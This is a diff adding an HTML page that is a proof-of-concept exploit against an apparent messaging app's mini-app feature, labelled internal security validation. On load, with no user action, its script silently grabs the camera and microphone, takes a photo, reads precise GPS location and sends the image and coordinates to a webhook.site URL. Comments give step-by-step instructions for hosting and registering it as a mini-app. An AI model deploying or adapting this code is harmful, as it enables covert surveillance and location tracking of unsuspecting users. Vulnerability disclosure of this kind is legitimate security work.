@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Arattai Mini-App PoC — Silent Camera + Location Exfil</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #0f0f0f;
+      color: #e0e0e0;
+      padding: 20px;
+      min-height: 100vh;
+    }
+    h2 { color: #ff4444; font-size: 18px; margin-bottom: 4px; }
+    .subtitle { color: #888; font-size: 13px; margin-bottom: 20px; }
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+    .card h3 { color: #fff; font-size: 15px; margin-bottom: 12px; }
+    .status {
+      font-size: 13px;
+      padding: 8px 12px;
+      border-radius: 8px;
+      margin: 6px 0;
+      background: #111;
+      border-left: 3px solid #555;
+      word-break: break-all;
+    }
+    .status.ok { border-left-color: #00cc66; color: #00cc66; }
+    .status.err { border-left-color: #ff4444; color: #ff4444; }
+    .status.info { border-left-color: #4499ff; color: #4499ff; }
+    .status.warn { border-left-color: #ffaa00; color: #ffaa00; }
+    canvas, video { display: none; }
+    img#snapshot {
+      width: 100%;
+      max-width: 320px;
+      border-radius: 8px;
+      margin-top: 10px;
+      display: none;
+      border: 2px solid #00cc66;
+    }
+    .badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: bold;
+      margin-left: 8px;
+    }
+    .badge.granted { background: #003322; color: #00cc66; }
+    .badge.denied { background: #330000; color: #ff4444; }
+    .badge.pending { background: #222; color: #ffaa00; }
+  </style>
+</head>
+<body>
+
+  <h2>⚠ Arattai Mini-App — Silent Sensor PoC</h2>
+  <p class="subtitle">Internal security validation. Do not distribute.</p>
+
+  <!-- ───────────────────────────── WEBHOOK CONFIG ───────────────────────────── -->
+  <!--
+    HOW TO USE:
+    1. Go to https://webhook.site  →  copy YOUR unique URL
+    2. Replace the placeholder below with it
+    3. Host this file on GitHub Pages (any public repo → Settings → Pages)
+    4. Register that GitHub Pages URL as a Mini-App link in Arattai Business
+    5. Open the Mini-App on Arattai Android → watch webhook.site receive the data
+  -->
+  <script>
+    // ✏ CHANGE THIS to your webhook.site URL
+    const WEBHOOK_URL = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
+
+    // ── helpers ──────────────────────────────────────────────────────────────────
+    function log(msg, type = "info") {
+      const d = document.createElement("div");
+      d.className = "status " + type;
+      d.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+      document.getElementById("log").appendChild(d);
+      console.log(msg);
+    }
+
+    function sendToWebhook(payload) {
+      const body = JSON.stringify(payload);
+      // Primary: fetch
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        mode: "no-cors",         // avoids CORS preflight on WebView
+        headers: { "Content-Type": "application/json" },
+        body
+      }).then(() => log("✅ Payload sent to webhook (fetch)", "ok"))
+        .catch(e => {
+          log("fetch failed (" + e + "), trying sendBeacon…", "warn");
+          // Fallback: sendBeacon (works even in restrictive WebViews)
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(WEBHOOK_URL, new Blob([body], { type: "application/json" }));
+            log("✅ Payload sent via sendBeacon", "ok");
+          }
+        });
+    }
+
+    // ── 1. CAMERA EXPLOIT ────────────────────────────────────────────────────────
+    async function runCameraExploit() {
+      log("Camera: requesting getUserMedia({video:true, audio:true})…", "info");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        log("🔴 CAMERA+MIC GRANTED SILENTLY — no prompt shown", "ok");
+        log("Tracks: " + stream.getTracks().map(t => t.kind + ":" + t.label).join(", "), "ok");
+
+        // Let the video stabilise for 500 ms then capture a frame
+        const video = document.getElementById("videoEl");
+        video.srcObject = stream;
+        await video.play();
+        await new Promise(r => setTimeout(r, 600));
+
+        // Capture frame → canvas → JPEG data-URL
+        const canvas = document.getElementById("canvasEl");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const jpeg = canvas.toDataURL("image/jpeg", 0.6);   // quality 60%
+
+        // Show locally
+        const snap = document.getElementById("snapshot");
+        snap.src = jpeg;
+        snap.style.display = "block";
+        log("Frame captured: " + canvas.width + "×" + canvas.height + " px", "ok");
+
+        // Exfiltrate
+        sendToWebhook({
+          type: "camera_capture",
+          origin: location.href,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+          tracks: stream.getTracks().map(t => ({ kind: t.kind, label: t.label, readyState: t.readyState })),
+          imageDataUrl: jpeg    // base64 JPEG of front-camera frame
+        });
+
+        // Stop all tracks after capture
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) {
+        log("Camera denied/error: " + e.name + " — " + e.message, "err");
+      }
+    }
+
+    // ── 2. GEOLOCATION EXPLOIT ───────────────────────────────────────────────────
+    function runLocationExploit() {
+      log("Geolocation: calling getCurrentPosition…", "info");
+      if (!navigator.geolocation) {
+        log("navigator.geolocation not available on this origin", "err");
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+          log("🔴 GEOLOCATION GRANTED SILENTLY — lat=" + lat.toFixed(6)
+              + " lon=" + lon.toFixed(6) + " acc=" + acc + "m", "ok");
+
+          const mapsLink = "https://maps.google.com/maps?q=" + lat + "," + lon;
+          log("Maps: " + mapsLink, "ok");
+
+          sendToWebhook({
+            type: "geolocation_capture",
+            origin: location.href,
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            latitude: lat,
+            longitude: lon,
+            accuracy: acc,
+            altitude: pos.coords.altitude,
+            mapsUrl: mapsLink
+          });
+        },
+        function(err) {
+          // code 1 = PERMISSION_DENIED, code 3 = TIMEOUT (location granted but no GPS fix)
+          if (err.code === 3) {
+            log("Geolocation TIMEOUT (code=3) — permission was GRANTED but no GPS fix on device", "warn");
+            log("  → In a real attack on a real device with GPS, coords would be exfiltrated", "warn");
+          } else {
+            log("Geolocation denied/error: code=" + err.code + " " + err.message, "err");
+          }
+        },
+        { timeout: 10000, enableHighAccuracy: true }
+      );
+    }
+
+    // ── 3. CONTEXT FINGERPRINT ───────────────────────────────────────────────────
+    function logContext() {
+      log("origin: " + location.href, "info");
+      log("isSecureContext: " + window.isSecureContext, window.isSecureContext ? "ok" : "warn");
+      log("navigator.mediaDevices exists: " + (!!navigator.mediaDevices), !!navigator.mediaDevices ? "ok" : "err");
+      log("navigator.geolocation exists: " + (!!navigator.geolocation), !!navigator.geolocation ? "ok" : "err");
+      log("userAgent: " + navigator.userAgent, "info");
+    }
+
+    // ── BOOT ─────────────────────────────────────────────────────────────────────
+    window.addEventListener("DOMContentLoaded", function() {
+      logContext();
+      // Run both exploits immediately on page load — no user gesture needed
+      runCameraExploit();
+      runLocationExploit();
+    });
+  </script>
+
+  <!-- ────────────────────────── UI ────────────────────────── -->
+  <div class="card">
+    <h3>📋 Execution Log</h3>
+    <div id="log"></div>
+  </div>
+
+  <div class="card">
+    <h3>📸 Captured Camera Frame</h3>
+    <img id="snapshot" alt="Camera snapshot will appear here" />
+  </div>
+
+  <!-- Hidden media elements used by the camera exploit -->
+  <video id="videoEl" autoplay muted playsinline></video>
+  <canvas id="canvasEl"></canvas>
+
+</body>
+</html>
